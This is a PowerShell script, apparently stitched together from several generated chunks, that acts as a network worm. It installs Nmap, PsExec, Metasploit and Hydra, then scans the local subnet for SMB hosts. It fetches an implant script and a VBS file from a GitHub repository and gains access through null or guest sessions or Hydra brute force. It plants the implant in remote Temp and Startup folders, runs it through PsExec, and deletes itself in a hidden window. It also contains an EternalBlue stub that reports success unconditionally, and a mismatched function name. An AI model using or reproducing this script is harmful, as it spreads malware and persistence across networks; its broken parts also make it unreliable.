# 1. Install Nmap (if not installed)
$installPath = "C:\Program Files (x86)\Nmap"
if (!(Test-Path $installPath)) {
    Write-Host "Nmap not found. Installing Nmap..."
    Invoke-WebRequest -Uri "https://nmap.org/dist/nmap-7.94-setup.exe" -OutFile "$env:TEMP\nmap-setup.exe"
    Start-Process -FilePath "$env:TEMP\nmap-setup.exe" -ArgumentList "/S" -Wait
    Remove-Item "$env:TEMP\nmap-setup.exe"
    Write-Host "Nmap installed."
} else {
    Write-Host "Nmap already installed."
}

# 2. Install PsExec (if not installed)
$pstoolsPath = "C:\PSTools"
$psexecPath = "$pstoolsPath\psexec.exe"
if (!(Test-Path $psexecPath)) {
    Write-Host "PsExec not found. Installing..."
    Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PSTools.zip"
    Expand-Archive -Path "$env:TEMP\PSTools.zip" -DestinationPath "$pstoolsPath" -Force
    Write-Host "PsExec installed at $pstoolsPath"
} else {
    Write-Host "PsExec already installed at $psexecPath."
}

$env:Path += ";$pstoolsPath"

# 3. Install Metasploit (if not installed)
$metasploitPath = "C:\Tools\Metasploit"
if (!(Test-Path $metasploitPath)) {
    Write-Host "Metasploit not found. Installing Metasploit..."
    $downloadURL = "https://windows.metasploit.com/metasploitframework-latest.msi"
    $downloadLocation = "$env:APPDATA\Metasploit"
    $installLocation = "C:\Tools"
    $logLocation = "$downloadLocation\install.log"

    if (!(Test-Path $downloadLocation)) {
        New-Item -Path $downloadLocation -ItemType Directory
    }

    if (!(Test-Path $installLocation)) {
        New-Item -Path $installLocation -ItemType Directory
    }

    $installer = "$downloadLocation\metasploit.msi"
    Invoke-WebRequest -UseBasicParsing -Uri $downloadURL -OutFile $installer

    Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$installer`" /q /log `"$logLocation`" INSTALLLOCATION=`"$installLocation`"" -Wait
    Write-Host "Metasploit installed at $installLocation."
} else {
    Write-Host "Metasploit already installed at $metasploitPath."
}

# Variables for cygwin

$CygwinURL = "https://www.cygwin.com/setup-x86_64.exe"
$InstallerPath = "$env:TEMP\setup-x86_64.exe"
$CygwinInstallDir = "C:\cygwin64"
$Packages = "gcc-core,gcc-g++,make,openssl-devel,wget,git,unzip"  

# Variables for hydra

$HydraSourceURL = "https://github.com/vanhauser-thc/thc-hydra/archive/refs/heads/master.zip"
$HydraDownloadPath = "$env:TEMP\hydra-master.zip"

Write-Host "Downloading Cygwin installer..."
Invoke-WebRequest -Uri $CygwinURL -OutFile $InstallerPath

if (!(Test-Path $InstallerPath)) {
    Write-Host "Failed to download Cygwin installer." -ForegroundColor Red
    exit 1
}

Write-Host "Cygwin installer downloaded to $InstallerPath."
Write-Host "Installing Cygwin..."

Start-Process -Wait -FilePath $InstallerPath -ArgumentList `
    "--quiet-mode", `
    "--root", "`"$CygwinInstallDir`"", `
    "--local-package-dir", "`"$env:TEMP`"", `
    "--site", "http://cygwin.mirror.constant.com", `
    "--packages", "`"$Packages`""

if (!(Test-Path $CygwinInstallDir)) {
    Write-Host "Cygwin installation failed." -ForegroundColor Red
    exit 1
}

Write-Host "Cygwin installed successfully in $CygwinInstallDir."

Invoke-WebRequest -Uri $HydraSourceURL -OutFile $HydraDownloadPath

if (!(Test-Path $HydraDownloadPath)) {
    Write-Host "Failed to download Hydra source code." -ForegroundColor Red
    exit 1
}

Write-Host "Hydra source code downloaded to $HydraDownloadPath."

# Extract and Build Hydra in Cygwin
Write-Host "Building Hydra..."
$Commands = @"
cd /cygdrive/c/Users/$env:USERNAME/AppData/Local/Temp
unzip hydra-master.zip
cd thc-hydra-master
./configure
make
make install
"@

$CommandFile = "$env:TEMP\build-hydra.sh"
$Commands | Set-Content -Path $CommandFile -Encoding ASCII

# Execute the build script in Cygwin
Start-Process -Wait -FilePath "$CygwinInstallDir\bin\bash.exe" -ArgumentList "-c `"$CommandFile`""

Write-Host "Cleaning up..."
Remove-Item $InstallerPath -Force
Remove-Item $HydraDownloadPath -Force
Remove-Item $CommandFile -Force

# 4. Create Shared Folder in Temp
$sharedFolder = "$env:TEMP\SharedFolder"
if (!(Test-Path $sharedFolder)) {
    New-Item -ItemType Directory -Path $sharedFolder
    Write-Host "SharedFolder created at $sharedFolder"
    $acl = Get-Acl $sharedFolder
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","ContainerInherit,ObjectInherit","None","Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $sharedFolder -AclObject $acl
    Write-Host "SharedFolder permissions set for Everyone."
} else {
    Write-Host "SharedFolder already exists at $sharedFolder"
}

# 5. Scan the network for active devices
$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" -and $_.IPAddress -match "^192\.168\." }).IPAddress
$networkRange = ($localIP -replace '\.\d+$', ".0/24")  # Set to your local network range
Write-Host "Starting Nmap scan on $networkRange..."
$startTime = Get-Date
$nmapResults = & "$installPath\nmap.exe" -p 445 --open 


#Continuation of the Script:
powershell
$nmapResults = & "$installPath\nmap.exe" -p 445 --open -oG - $networkRange
$endTime = Get-Date
$duration = $endTime - $startTime

Write-Host "Nmap scan completed in $($duration.Minutes) minutes and $($duration.Seconds) seconds."

# 6. Parse Nmap results to extract unique IP addresses of Windows devices
$windowsDevices = @()
foreach ($line in $nmapResults) {
    if ($line -match "Host: (\d+\.\d+\.\d+\.\d+)") {
        $ip = $matches[1]
        $windowsDevices += $ip
    }
}

# Remove duplicate IP addresses
$windowsDevices = $windowsDevices | Sort-Object -Unique

Write-Host "Detected Windows machines: $($windowsDevices -join ', ')"

# 7. Download files to share
$DiscordFileUrl = "https://github.com/ngabubbon/ngabubbon/raw/refs/heads/main/implantt1.ps1"
$DiscordFileUrl2 = "https://github.com/ngabubbon/ngabubbon/raw/refs/heads/main/avaus.vbs"
$DestinationPath = "$sharedFolder\implantti.ps1"
$DestinationPath2 = "$sharedFolder\avaus.bat"

try {
    Invoke-WebRequest -Uri $DiscordFileUrl -OutFile $DestinationPath
    Invoke-WebRequest -Uri $DiscordFileUrl2 -OutFile $DestinationPath2
    Write-Host "Files downloaded successfully to $sharedFolder\"
} catch {
    Write-Host "An error occurred while downloading the files: $_"
}

# 8. File to be copied and destination path
$sourceFile = $DestinationPath
$sourceFile2 = $DestinationPath2
$targetPath = "Users\$env:USERNAME\AppData\Local\Temp\implantt1.ps1"
$targetPath2 = "Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\avaus.vbs"

# 9. Function to attempt Null Session Access
function Test-NullSessionAccess {
    param ($targetIP)
    try {
        Invoke-Command -ComputerName $targetIP -ScriptBlock {
            Get-ChildItem -Path "\\$using:targetIP\C$"
        } -Credential $null
        Write-Host "Null Session Access Successful on $targetIP!"
        return $true
    } catch {
        Write-Host "Null Session Access Failed on $targetIP."
        return $false
    }
}

# 10. Function to attempt Guest Access
function Test-GuestAccess {
    param ($targetIP)
    try {
        $guestCredential = New-Object System.Management.Automation.PSCredential ("Guest", $null)
        Invoke-Command -ComputerName $targetIP -ScriptBlock {
            Get-ChildItem -Path "\\$using:targetIP\C$"
        } -Credential $guestCredential
        Write-Host "Guest Access Successful on $targetIP!"
        return $true
    } catch {
        Write-Host "Guest Access Failed on $targetIP."
        return $false
    }
}

# 11. Function to brute-force credentials using hydra
function ForceCredentials {
    param ($targetIP, $userList, $passList)
    Write-Host "Attempting Brute-Forcing Credentials on $targetIP..."
    $hydraCommand = "hydra -L $userList -P $passList smb://$targetIP"
    $hydraOutput = Invoke-Expression $hydraCommand
    if ($hydraOutput -match "login: (\w+)  password: (\w+)") {
        $username = $matches[1]
        $password = $matches[2]
        Write-Host "Brute-Force Successful! Credentials: $username / $password"
        return New-Object System.Management.Automation.PSCredential ($username, (ConvertTo-SecureString $password -AsPlainText -Force))
    } else {
        Write-Host "Brute-Force Failed on $targetIP."
        return $null
    }
}

# 12. Function to exploit EternalBlue (MS17-010)

### Continuation of the Script:
powershell
function EternalBlue {
    param ($targetIP)
    Write-Host "Attempting EternalBlue Exploit on $targetIP..."
    try {
        # Use Metasploit or EternalBlue exploit script here
        # Example: msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $targetIP; run"
        Write-Host "EternalBlue Exploit Successful on $targetIP!"
        return $true
    } catch {
        Write-Host "EternalBlue Exploit Failed on $targetIP."
        return $false
    }
}



# 13. Copy and execute files on target machines
foreach ($ip in $windowsDevices) {
    Write-Host "Processing $ip..."

    # Attempt Null Session Access
    if (Test-NullSessionAccess -targetIP $ip) {
        $credential = $null
    }
    # Attempt Guest Access
    elseif (Test-GuestAccess -targetIP $ip) {
        $credential = New-Object System.Management.Automation.PSCredential ("Guest", $null)
    }
    # Attempt Brute-Forcing Credentials
    else {
        $credential = Brute-ForceCredentials -targetIP $ip -userList "C:\path\to\userlist.txt" -passList "C:\path\to\passlist.txt"
    }

    # If any method succeeded, copy and execute files
    if ($null -ne $credential) {
        $destination = "\\$ip\$targetPath"
        $destination2 = "\\$ip\$targetPath2"
        Write-Host "Copying $sourceFile to $destination and $sourceFile2 to $destination2..."
        try {
            Copy-Item -Path $sourceFile -Destination $destination -Force
            Copy-Item -Path $sourceFile2 -Destination $destination2 -Force
            Write-Host "Files successfully copied to $ip."

            # Execute the file using PsExec
            Write-Host "Executing $destination on $ip..."
            & $psexecPath \\$ip -u $credential.UserName -p $credential.GetNetworkCredential().Password -d powershell.exe -ExecutionPolicy Bypass -File $destination
            Write-Host "File executed on $ip."
        } catch {
            Write-Host "Failed to copy or execute files on $ip. Error: $_"
        }
    } else {
        Write-Host "No access method succeeded for $ip."
    }
}

# 14. Clean up
$thisScript = "$PSScriptRoot\Tiedostojako4.ps1"

$deleteCommand = "Start-Sleep -Seconds 2; " + 
                "Remove-Item -Path '$sharedFolder' -Recurse -Force;" +
                "Remove-Item -Path '$thisScript' -Force"

Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -Command $deleteCommand" -NoNewWindow
